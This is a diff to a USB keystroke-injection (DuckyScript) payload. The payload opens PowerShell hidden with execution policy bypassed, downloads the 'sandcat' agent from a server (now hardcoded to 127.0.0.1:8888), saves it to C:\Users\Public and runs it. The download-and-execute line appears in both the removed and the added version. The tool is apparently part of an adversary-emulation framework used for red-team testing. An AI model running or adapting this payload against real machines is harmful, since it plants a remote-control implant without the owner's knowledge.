@@ -1,4 +1,3 @@
-STRING $server=""
 DEFAULT_DELAY 150
 DELAY 300
 GUI r
@@ -6,6 +5,6 @@ DELAY 100
 STRING powershell
 ENTER
 DELAY 300
-STRING powershell.exe -W Hidden -ExecutionPolicy Bypass {$url="$server/file/download";$wc=New-Object System.Net.WebClient;$wc.Headers.add("platform","windows");$wc.Headers.add("file","sandcat.go");$output="C:\Users\Public\sandcat.exe";$wc.DownloadFile($url,$output);C:\Users\Public\sandcat.exe -server $server -group my_group;}
+STRING powershell.exe -W Hidden -ExecutionPolicy Bypass {$server="http://127.0.0.1:8888"; $url="$server/file/download"; $wc=New-Object System.Net.WebClient; $wc.Headers.add("platform","windows"); $wc.Headers.add("server", $server); $wc.Headers.add("file","sandcat.go"); ($data=$wc.DownloadData($url)) -and ($name=$wc.ResponseHeaders["Content-Disposition"].Substring($wc.ResponseHeaders["Content-Disposition"].IndexOf("filename=")+9).Replace("`"","")) -and ([io.file]::WriteAllBytes("C:\Users\Public\$name.exe",$data)) | Out-Null; iex "C:\Users\Public\$name.exe -server $server -v";}
 ENTER
 DELAY 1500
